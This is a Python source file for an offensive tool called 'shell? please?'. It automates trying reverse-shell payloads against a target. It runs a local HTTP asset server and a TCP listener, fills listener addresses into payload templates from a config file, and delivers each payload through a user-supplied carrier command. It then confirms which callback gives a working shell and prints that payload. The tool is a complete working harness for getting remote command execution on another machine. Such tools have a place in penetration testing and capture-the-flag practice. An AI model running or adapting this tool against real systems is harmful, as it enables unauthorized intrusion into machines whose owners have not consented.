#!/usr/bin/python3
'''
     _          _ _ ___          _                    ___  
    | |        | | |__ \        | |                   |__ \ 
 ___| |__   ___| | |  ) |  _ __ | | ___  __ _ ___  ___  ) |
/ __| '_ \ / _ \ | | / /  | '_ \| |/ _ \/ _` / __|/ _ \/ / 
\__ \ | | |  __/ | ||_|   | |_) | |  __/ (_| \__ \  __/_|  
|___/_| |_|\___|_|_|(_)   | .__/|_|\___|\__,_|___/\___(_)  
                          | |                              
                          |_|                      chximn
'''

import socket, socketserver, os, json, time, threading, subprocess, signal, string, random, argparse, re
from assets_server import AssetsServer

# script's directory 
here = os.path.dirname(os.path.realpath(__file__)) + "/"

# parse arguments
parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter, description="Shell? Please?")
parser.add_argument('-H',  '--host', '--local-host', type=str, help='local host', default='')
parser.add_argument('-s',  '--carrier-script', type=str, help='shell script that sends the payload to the target, it should use a positional parameter as payload', default="")
parser.add_argument('-c',  '--carrier-command', type=str, help='shell command that sends the payload to the target, it should use a PAYLOAD env variable as payload', default="")
parser.add_argument('-C',  '--config', type=str, help='.json configuration file location', default= here + 'config.json')
parser.add_argument('-os', '--os', choices=['linux', 'windows', 'mac'], help='target operating system', default='linux')
parser.add_argument('-sh', '--remote-shell', type=str, help='shell to be executed', default='')
parser.add_argument('-p',  '--port', '--local-port', type=int, help='local port', default=0)
parser.add_argument('-P',  '-hp', '--http-server-port', type=int, help='http port to serve assets', default=0)
parser.add_argument('-a',  '--all', action='store_true', help='check all payloads')
parser.add_argument('-ct', '--connection-timeout', type=float, help='connection accept timeout in seconds', default=1)
parser.add_argument('-et', '--echo-timeout', type=float, help='echo check timeout in seconds', default=3)
parser.add_argument('-po', '--print-only', action='store_true', help='print paylods only, don\'t check.')
args = parser.parse_args()

# check carrier arguments
if args.carrier_script == "" and args.carrier_command == "":
	print("[-] You must provide a --carrier-script or a --carrier-command argument")
	exit(1)

# load configuration file
try:
	f = open(args.config)
except OSError:
	print("[-] Could not open config file: %s" % (args.config))

with f:
	config = json.load(f)
	shells = config["shells"]
	assets = config["assets"] if "assets" in config else here + "assets/" 

# check host argument
if args.host == '':
	print('[-] You must provide the --local-host argument')
	exit(1)
host = args.host

# check shell
if args.remote_shell == '':
	sh = 'cmd.exe' if args.os == 'windows' else '/bin/sh'
else:
	sh = args.remote_shell

# ports
port, http_port = args.port, args.http_server_port

# print-only mode
if args.print_only:
	if args.host == 0 or args.http_server_port == 0:
		print("[-] You must provide both --local-port and --http-server-port arguments")
		exit(1)

# start http server and tcp listener
else:
	# finds a free port if http_server_port was not supplied
	with socketserver.TCPServer(("localhost", http_port), None) as s:
		http_port = s.server_address[1]

	# serve the assets through http
	http_server = AssetsServer((host, http_port), assets)
	http_server.start()
	print("[+] started http server on %s:%d" % (host, http_port))

	# start the tcp listener
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(args.connection_timeout) 
	sock.bind((host, args.port))
	port = sock.getsockname()[1]
	sock.listen()
	print("[+] started tcp listener on %s:%d" % (host, port))


# carrier thread
def payload_carrier_thread(payload, exit_event):
	# script carrier
	if args.carrier_script != "":
		process = subprocess.Popen([args.carrier_script, payload], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

	# command carrier
	else:
		process = subprocess.Popen(["/bin/bash", "-c", args.carrier_command], env={'PAYLOAD': payload}, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		
	while not exit_event.is_set():
		time.sleep(0.1)

	process.kill()

# send payload with the supplied carrier
def send_payload(payload):
	exit_event = threading.Event()
	t = threading.Thread(target=payload_carrier_thread, args=(payload, exit_event))
	t.start()
	return exit_event
		
# go through our pretty shells
for shell in shells:
	# if not "ncat.exe -e w/ download over cmd" in shell['name']:
	# 	continue

	# check disabled status
	if 'disabled' in shell and shell['disabled'] == True:
		continue

	# check operating system
	if not args.os in shell['os']:
		continue
	
	# craft payload
	rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	payload = shell['command'].replace('{local-host}', host) \
							  .replace('{tcp-listener-port}', str(port)) \
							  .replace('{http-server-port}', str(http_port)) \
							  .replace('{shell}', sh) \
							  .replace('{random}', rand)

	# print-only mode
	if args.print_only:
		print(payload)
		continue


	# send payload
	print("[*] %s" % (shell['name']), end="", flush=True)
	exit_event = send_payload(payload)

	# wait for connection
	successful = True
	try:
		connection, address = sock.accept()
		
	# timed out
	except socket.timeout as e:
		successful = False

	finally:
		# terminate thread
		exit_event.set()

	# connection timed out
	if not successful:
		print("\r\033[91m[-] %s\033[0m" % (shell['name']))

	# connection accepted
	else:
		print("\r\033[96m[+] %s\033[0m" % (shell['name']), end="", flush=True)

		# echo check
		# read until timeout
		connection.settimeout(args.echo_timeout)
		connection.send(b"")
		while True:
			try:
				connection.recv(1024)
			except socket.timeout as e:
				break
		
		# greet
		connection.send(b"\necho hello\n")

		# wait for reply
		data = b""
		try:
			data = connection.recv(1024)
		except socket.timeout as e:
			# timed out
			pass

		if b"hello" in data:
			# echo test passed
			print("\r\033[92m[+] %s\033[0m" % (shell['name']))
		else:
			# echo test failed
			print("\r\033[93m[+] %s\033[0m" % (shell['name']))

		# quit the shell
		connection.send(b"exit\n")
		connection.close()
		
		# print payload and break if not checkiung all other ones
		if not args.all:
			print("payload: ")
			print(payload)
			break

# stop http server and tcp listener if opened
if not args.print_only:
	sock.close()
	http_server.stop()